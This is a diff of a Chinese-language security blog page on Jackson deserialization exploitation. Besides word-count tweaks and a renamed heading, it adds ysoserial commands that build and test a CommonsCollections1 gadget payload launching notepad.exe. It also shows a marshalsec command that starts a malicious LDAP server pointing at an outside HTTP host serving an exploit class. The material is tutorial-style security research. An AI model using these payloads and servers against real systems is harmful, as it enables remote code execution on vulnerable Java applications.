@@ -702,7 +702,7 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        4.9k
+                        5k
                     </div>
                     
 
@@ -1253,8 +1253,11 @@
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>这里的deserialize 会判断是否开启了 Default Typing ，如果开启了该属性则使⽤ deserializeWithType ⽅法获取值，反之使⽤ deserialize ⽅法获取值 。</strong> </p>
-<h2 id="三、Jackson反序列化利用"><a href="#三、Jackson反序列化利用" class="headerlink" title="三、Jackson反序列化利用"></a>三、Jackson反序列化利用</h2><h3 id="3-1-ysoserial快速生成"><a href="#3-1-ysoserial快速生成" class="headerlink" title="3.1 ysoserial快速生成"></a>3.1 ysoserial快速生成</h3><p>1.生成利用链代码（Exploit Class 字节码，通过Class.loadClass）</p>
-<pre class="line-numbers language-shell"><code class="language-shell">java -jar ysoserial.jar CommonsCollections1 notepad.exe |base64<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="三、Jackson类加载利用"><a href="#三、Jackson类加载利用" class="headerlink" title="三、Jackson类加载利用"></a>三、Jackson类加载利用</h2><h3 id="3-1-ysoserial快速生成"><a href="#3-1-ysoserial快速生成" class="headerlink" title="3.1 ysoserial快速生成"></a>3.1 ysoserial快速生成</h3><p>1.生成利用链代码（Exploit Class 字节码，通过Class.loadClass）</p>
+<pre class="line-numbers language-shell"><code class="language-shell">java -jar ysoserial.jar CommonsCollections1 notepad.exe |base64
+#验证
+java -jar ysoserial.jar CommonsCollections1 notepad.exe >poc.bin
+java -cp ysoserial.jar ysoserial.Deserializer poc.bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201226234047772.png" alt="image-20201226234047772"></p>
 <p>2.marshalsec 快速搭建LDAP|RMI服务</p>
 <pre class="line-numbers language-shell"><code class="language-shell">java -cp target\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.58.131:8080/#ExecTest 1099<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -2344,7 +2347,7 @@ public class TestPOC <span class="token punctuation">{</span>
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">45.5k</span> 字
+                <span class="white-color">47.6k</span> 字
             
 
             
